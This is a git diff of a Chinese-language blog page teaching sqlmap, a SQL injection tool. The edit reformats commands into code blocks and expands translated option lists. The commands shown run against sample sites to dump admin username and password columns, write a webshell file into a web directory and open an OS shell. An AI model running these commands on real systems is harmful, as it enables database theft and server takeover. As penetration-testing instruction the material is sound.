@@ -225,7 +225,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-09-03 18:46:04 / 修改时间：18:52:38" itemprop="dateCreated datePublished" datetime="2023-09-03T18:46:04+08:00">2023-09-03</time>
+      <time title="创建时间：2023-09-03 18:46:04 / 修改时间：19:45:28" itemprop="dateCreated datePublished" datetime="2023-09-03T18:46:04+08:00">2023-09-03</time>
     </span>
 
   
@@ -235,14 +235,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>6.2k</span>
+      <span>11k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>11 分钟</span>
+      <span>19 分钟</span>
     </span>
 </div>
 
@@ -262,190 +262,182 @@
 <li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
 </ul>
 <h3 id="sqlmap支持的数据库有"><a href="#sqlmap支持的数据库有" class="headerlink" title="sqlmap支持的数据库有"></a>sqlmap支持的数据库有</h3><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
-<h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a></p>
+<h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”</span><br></pre></td></tr></table></figure>
+
 <p>默认使用level1检测全部数据库类型</p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3</span><br></pre></td></tr></table></figure>
+
 <p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
 <h3 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h3><p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br> 当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br> 目的就是：要追踪到错误信息。</p>
-<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当程序有防get注入的时候，可以使用cookie注入<br> sqlmap -u “<a target="_blank" rel="noopener" href="http://www.baidu.com/shownews.asp%E2%80%9D">http://www.baidu.com/shownews.asp”</a> –cookie “id&#x3D;11” –level 2（只有level达到2才会检测cookie）</p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当程序有防get注入的时候，可以使用cookie注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）</span><br></pre></td></tr></table></figure>
+
 <h3 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h3><p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
-<p>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql   指定username参数</p>
-<h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 –dbs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql   指定username参数</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs</span><br></pre></td></tr></table></figure>
+
 <p>查询有哪些数据库</p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test –tables</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables</span><br></pre></td></tr></table></figure>
+
 <p>查询test数据库中有哪些表</p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test -T admin –columns</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns</span><br></pre></td></tr></table></figure>
+
 <p>查询test数据库中admin表有哪些字段</p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://www.vuln.cn/post.php?id=1%E2%80%9D">http://www.vuln.cn/post.php?id=1”</a>  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</span><br></pre></td></tr></table></figure>
+
 <p>dump出字段username与password中的数据</p>
 <p>其他命令参考下面</p>
-<h3 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h3><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br> 在dedecms数据库中搜索字段admin或者password。</p>
+<h3 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</span><br></pre></td></tr></table></figure>
+
+<p> 在dedecms数据库中搜索字段admin或者password。</p>
 <h3 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h3><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
-<p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br> –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br> –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径<br> #示例：<br> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest  “e:\php\htdocs\dvwa\inc\include\1.php” –file-write  “f:\webshell\1112.php”</p>
+<p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br> –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br> –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径<br> 示例：<br> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest  “e:\php\htdocs\dvwa\inc\include\1.php” –file-write  “f:\webshell\1112.php”</p>
 <p>使用shell命令：</p>
 <p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br> 接下来指定网站可写目录：<br> “E:\php\htdocs\dvwa”</p>
-<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p>
+<p><strong>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</strong></p>
 <h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br></pre></td></tr></table></figure>
 
-<h3 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h3><ul>
-<li>–version 显示程序的版本号并退出</li>
-<li>-h, –help 显示此帮助消息并退出</li>
-<li>-v VERBOSE 详细级别：0-6（默认为1）</li>
+<h3 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-h, --help 显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh</span><br><span class="line"></span><br><span class="line">显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version 显示程序版本号</span><br><span class="line"></span><br><span class="line">-v VERBOSE 赘言级别：0-6(默认 1)</span><br><span class="line"></span><br><span class="line">目标：</span><br><span class="line"></span><br><span class="line">-d DIRECT 直接连接到数据库</span><br><span class="line"></span><br><span class="line">-u URL, --url=URL 目标 URL(e.g. &quot;www.target.com/vuln.php?id=1&quot;)</span><br><span class="line"></span><br><span class="line">-l LOGFILE 从 Burp 或 WebScarab 日志中解析目标</span><br><span class="line"></span><br><span class="line">-m BULKFILE</span><br><span class="line"></span><br><span class="line">在给定的文本文件中读取多个扫描目标</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK 将 Google dork 结果作为目标 URL</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE 从文件中读取 HTTP 请求</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE 从 INI 配置文件中读取配置选项</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>保存进度继续跑：</li>
 </ul>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://url/news?id=1%E2%80%9C">http://url/news?id=1“</a> –dbs-o “sqlmap.log” 保存进度<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://url/news?id=1%E2%80%9C">http://url/news?id=1“</a> –dbs-o “sqlmap.log” –resume 恢复已保存进度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br><span class="line">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span><br></pre></td></tr></table></figure>
+
 <h3 id="Target（目标）："><a href="#Target（目标）：" class="headerlink" title="Target（目标）："></a>Target（目标）：</h3><p>以下至少需要设置其中一个选项，设置目标URL。</p>
-<ul>
-<li>-d DIRECT 直接连接到数据库。</li>
-<li>-u URL, –url&#x3D;URL 目标URL。</li>
-<li>-l LIST 从Burp或WebScarab代理的日志中解析目标。</li>
-<li>-r REQUESTFILE 从一个文件中载入HTTP请求。</li>
-<li>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</li>
-<li>-c CONFIGFILE 从INI配置文件中加载选项。</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-d DIRECT 直接连接到数据库。</span><br><span class="line">-u URL, –url=URL 目标URL。</span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">-g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line">-c CONFIGFILE 从INI配置文件中加载选项。</span><br></pre></td></tr></table></figure>
+
 <h3 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h3><p>这些选项可以用来指定如何连接到目标URL。</p>
-<ul>
-<li>–data&#x3D;DATA 通过POST发送的数据字符串</li>
-<li>–cookie&#x3D;COOKIE HTTP Cookie头</li>
-<li>–cookie-urlencode URL 编码生成的cookie注入</li>
-<li>–drop-set-cookie 忽略响应的Set – Cookie头信息</li>
-<li>–user-agent&#x3D;AGENT 指定 HTTP User – Agent头</li>
-<li>–random-agent 使用随机选定的HTTP User – Agent头</li>
-<li>–referer&#x3D;REFERER 指定 HTTP Referer头</li>
-<li>–headers&#x3D;HEADERS 换行分开，加入其他的HTTP头</li>
-<li>–auth-type&#x3D;ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</li>
-<li>–auth-cred&#x3D;ACRED HTTP身份验证凭据（用户名:密码）</li>
-<li>–auth-cert&#x3D;ACERT HTTP认证证书（key_file，cert_file）</li>
-<li>–proxy&#x3D;PROXY 使用HTTP代理连接到目标URL</li>
-<li>–proxy-cred&#x3D;PCRED HTTP代理身份验证凭据（用户名：密码）</li>
-<li>–ignore-proxy 忽略系统默认的HTTP代理</li>
-<li>–delay&#x3D;DELAY 在每个HTTP请求之间的延迟时间，单位为秒</li>
-<li>–timeout&#x3D;TIMEOUT 等待连接超时的时间（默认为30秒）</li>
-<li>–retries&#x3D;RETRIES 连接超时后重新连接的时间（默认3）</li>
-<li>–scope&#x3D;SCOPE 从所提供的代理日志中过滤器目标的正则表达式</li>
-<li>–safe-url&#x3D;SAFURL 在测试过程中经常访问的url地址</li>
-<li>–safe-freq&#x3D;SAFREQ 两次访问之间测试请求，给出安全的URL</li>
-</ul>
-<h3 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br> 您自己的SQL语句。</p>
-<ul>
-<li>-b, –banner 检索数据库管理系统的标识</li>
-<li>–current-user 检索数据库管理系统当前用户</li>
-<li>–current-db 检索数据库管理系统当前数据库</li>
-<li>–is-dba 检测DBMS当前用户是否DBA</li>
-<li>–users 枚举数据库管理系统用户</li>
-<li>–passwords 枚举数据库管理系统用户密码哈希</li>
-<li>–privileges 枚举数据库管理系统用户的权限</li>
-<li>–roles 枚举数据库管理系统用户的角色</li>
-<li>–dbs 枚举数据库管理系统数据库</li>
-<li>-D DBname 要进行枚举的指定数据库名</li>
-<li>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</li>
-<li>–tables 枚举的DBMS数据库中的表</li>
-<li>–columns 枚举DBMS数据库表列</li>
-<li>–dump 转储数据库管理系统的数据库中的表项</li>
-<li>–dump-all 转储所有的DBMS数据库表中的条目</li>
-<li>–search 搜索列（S），表（S）和&#x2F;或数据库名称（S）</li>
-<li>-C COL 要进行枚举的数据库列</li>
-<li>-U USER 用来进行枚举的数据库用户</li>
-<li>–exclude-sysdbs 枚举表时排除系统数据库</li>
-<li>–start&#x3D;LIMITSTART 第一个查询输出进入检索</li>
-<li>–stop&#x3D;LIMITSTOP 最后查询的输出进入检索</li>
-<li>–first&#x3D;FIRSTCHAR 第一个查询输出字的字符检索</li>
-<li>–last&#x3D;LASTCHAR 最后查询的输出字字符检索</li>
-<li>–sql-query&#x3D;QUERY 要执行的SQL语句</li>
-<li>–sql-shell 提示交互式SQL的shell</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA 通过 POST 方法提交的数据字符串--param-del=PDEL 用于分割参数值的字符</span><br><span class="line">--cookie=COOKIE HTTP Cookie 头</span><br><span class="line">--cookie-del=CDEL 用于分割 cookie 值的字符</span><br><span class="line">--load-cookies=L.. 包含 cookies 的 Netscape/wget 格式文件</span><br><span class="line">--drop-set-cookie 忽略响应中的 Set-Cookie 头</span><br><span class="line">--user-agent=AGENT</span><br><span class="line">HTTP User-Agent 头</span><br><span class="line">--random-agent 使用随机选择的 HTTP User-Agent 头</span><br><span class="line">--host=HOST HTTP Host 头</span><br><span class="line">--referer=REFERER HTTP Referer 头</span><br><span class="line">--headers=HEADERS Extra 头(e.g. &quot;Accept-Language: fr\nETag: 123&quot;)</span><br><span class="line">--auth-type=AUTH.. HTTP 认证方式(Basic, Digest, NTLM 或 PKI)</span><br><span class="line">--auth-cred=AUTH.. HTTP 认证证书(name:password)</span><br><span class="line">--auth-private=A.. HTTP 认证 PEM 私钥文件</span><br><span class="line">--proxy=PROXY 使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO.. 代理认证证书(name:password)</span><br><span class="line">--proxy-file=PRO.. 从文件读取代理列表</span><br><span class="line">--ignore-proxy 接受系统默认代理设置</span><br><span class="line">--tor 使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT 设置默认以外的 Tor 代理端口</span><br><span class="line">--tor-type=TORTYPE 设置 Tor 代理方式(HTTP(默认), SOCKS4 或</span><br><span class="line">SOCKS5)</span><br><span class="line">--check-tor 检查 Tor 是否正确使用--delay=DELAY 每个 HTTP 请求之间延迟的秒数</span><br><span class="line">--timeout=TIMEOUT 认定连接超时的秒数(默认 30)</span><br><span class="line">--retries=RETRIES 超时重试的次数(默认 3)</span><br><span class="line">--randomize=RPARAM 随机改变给定参数的值</span><br><span class="line">--safe-url=SAFURL 设置一个安全链接供系统经常访问</span><br><span class="line">--safe-freq=SAFREQ 设置一个安全连接供系统在两次测试之间访问</span><br><span class="line">--skip-urlencode 不对攻击载荷数据进行 URL 编码</span><br><span class="line">--force-ssl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br> 您自己的SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-a, --all 检索一切</span><br><span class="line">-b, --banner 检索 DBMS banner 信息</span><br><span class="line">--current-user 检索 DBMS 当前用户</span><br><span class="line">--current-db 检索 DBMS 当前数据库</span><br><span class="line">--hostname检索 DBMS 服务器主机名</span><br><span class="line">--is-dba 检测当前用户是否是 DBA</span><br><span class="line">--users枚举 DBMS 用户名</span><br><span class="line">--passwords枚举 DBMS 用户密码哈希</span><br><span class="line">--privileges 枚举 DBMS 用户权限</span><br><span class="line">--roles枚举 DBMS 用户角色</span><br><span class="line">--dbs 枚举 DBMS 数据库</span><br><span class="line">--tables 枚举 DBMS 数据库表--columns 枚举 DBMS 数据库表字段</span><br><span class="line">--schema 枚举 DBMS 架构</span><br><span class="line">--count检索数据表中的条目数</span><br><span class="line">--dump 转储 DBMS 数据库表中的条目</span><br><span class="line">--dump-all 转储所有 DBMS 数据库表中的条目</span><br><span class="line">--search 搜索字段名, 表名和(或)库名</span><br><span class="line">--comments 检索 DBMS 注释</span><br><span class="line">-D DB DBMS 数据库</span><br><span class="line">-T TBL DBMS 数据库表</span><br><span class="line">-C COL DBMS 数据库表字段</span><br><span class="line">-X EXCLUDECOL 不枚举 DBMS 数据库表字段</span><br><span class="line">-U USER DBMS 用户</span><br><span class="line">--exclude-sysdbs 枚举数据库表时排除 DBMS 系统库</span><br><span class="line">--where=DUMPWHERE 转储数据表时使用 WHERE 条件</span><br><span class="line">--start=LIMITSTART 第一个查询的输出项检索</span><br><span class="line">--stop=LIMITSTOP 最后一个查询的输出项检索</span><br><span class="line">--first=FIRSTCHAR 第一个查询的输出字的字符检索</span><br><span class="line">--last=LASTCHAR 最后一个查询的输出字的字符检索</span><br><span class="line">--sql-query=QUERY 要执行的 SQL 语句</span><br><span class="line">--sql-shell返回交互式的 SQL shell</span><br><span class="line">--sql-file=SQLFILE 从给定的文件执行 SQL 语句强制暴破</span><br><span class="line">--common-tables 检查是否存在常见表</span><br><span class="line">--common-columns 检查是否存在常见字段</span><br></pre></td></tr></table></figure>
+
 <h3 id="Optimization（优化）："><a href="#Optimization（优化）：" class="headerlink" title="Optimization（优化）："></a>Optimization（优化）：</h3><p>这些选项可用于优化SqlMap的性能。</p>
-<ul>
-<li>-o 开启所有优化开关</li>
-<li>–predict-output 预测常见的查询输出</li>
-<li>–keep-alive 使用持久的HTTP（S）连接</li>
-<li>–null-connection 从没有实际的HTTP响应体中检索页面长度</li>
-<li>–threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-o 开启所有优化开关</span><br><span class="line"></span><br><span class="line">–predict-output 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">–keep-alive 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">–null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br></pre></td></tr></table></figure>
+
 <h3 id="Injection（注入）："><a href="#Injection（注入）：" class="headerlink" title="Injection（注入）："></a>Injection（注入）：</h3><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
-<ul>
-<li>-p TESTPARAMETER 可测试的参数（S）</li>
-<li>–dbms&#x3D;DBMS 强制后端的DBMS为此值</li>
-<li>–os&#x3D;OS 强制后端的DBMS操作系统为这个值</li>
-<li>–prefix&#x3D;PREFIX 注入payload字符串前缀</li>
-<li>–suffix&#x3D;SUFFIX 注入payload字符串后缀</li>
-<li>–tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER 测试参数</span><br><span class="line">--skip=SKIP跳过对给定参数的测试</span><br><span class="line">--dbms=DBMS在这里强制指定后端 DBMS--dbms-cred=DBMS.. DBMS 认证证书(user:password)</span><br><span class="line">--os=OS在这里强制后端 DBMS 操作系统</span><br><span class="line">--invalid-bignum 使用大数字无效化值</span><br><span class="line">--invalid-logical 使用逻辑运算无效化值</span><br><span class="line">--invalid-string 使用随机字符串无效化值</span><br><span class="line">--no-cast 关闭攻击载荷铸造机制</span><br><span class="line">--no-escape 关闭字符串逃逸机制</span><br><span class="line">--prefix=PREFIX 注入攻击载荷前缀字符串</span><br><span class="line">--suffix=SUFFIX 注入攻击载荷后缀字符串</span><br><span class="line">--tamper=TAMPER使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure>
+
 <h3 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
-<ul>
-<li>–level&#x3D;LEVEL 执行测试的等级（1-5，默认为1）</li>
-<li>–risk&#x3D;RISK 执行测试的风险（0-3，默认为1）</li>
-<li>–string&#x3D;STRING 查询时有效时在页面匹配字符串</li>
-<li>–regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式</li>
-<li>–text-only 仅基于在文本内容比较网页</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL 执行测试的等级(1-5, 默认 1)</span><br><span class="line">--risk=RISK 执行测试的风险(0-3, 默认 1)</span><br><span class="line">--string=STRING 查询被评估为 True 时的匹配字符串</span><br><span class="line">--not-string=NOT.. 查询被评估为 False 时的匹配字符串</span><br><span class="line">--regexp=REGEXP 查询被评估为 True 时的正则表达式</span><br><span class="line">--code=CODE 查询被评估为 True 时的 HTTP 代码</span><br><span class="line">--text-only 仅基于文本内容比较网页</span><br><span class="line">--titles 仅基于标题比较网页</span><br></pre></td></tr></table></figure>
+
 <h3 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h3><p>这些选项可用于调整具体的SQL注入测试。</p>
-<ul>
-<li>–technique&#x3D;TECH SQL注入技术测试（默认BEUST）</li>
-<li>–time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒）</li>
-<li>–union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入</li>
-<li>–union-char&#x3D;UCHAR 用于暴力猜解列数的字符</li>
-</ul>
-<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><ul>
-<li>-f, –fingerprint 执行检查广泛的DBMS版本指纹</li>
-</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH 使用的 SQL 注入技术(默认使用所有技术)--time-sec=TIMESEC DBMS 响应的延迟秒数(默认 5)</span><br><span class="line">--union-cols=UCOLS UNION 查询注入测试字段的范围</span><br><span class="line">--union-char=UCHAR 暴破字段数量使用的字符</span><br><span class="line">--union-from=UFROM UNION 查询注入 FROM 部分使用的数据表</span><br><span class="line">--dns-domain=DNS.. DNS 溢出攻击所使用的域名</span><br><span class="line">--second-order=S.. 二阶响应页面 URL</span><br></pre></td></tr></table></figure>
+
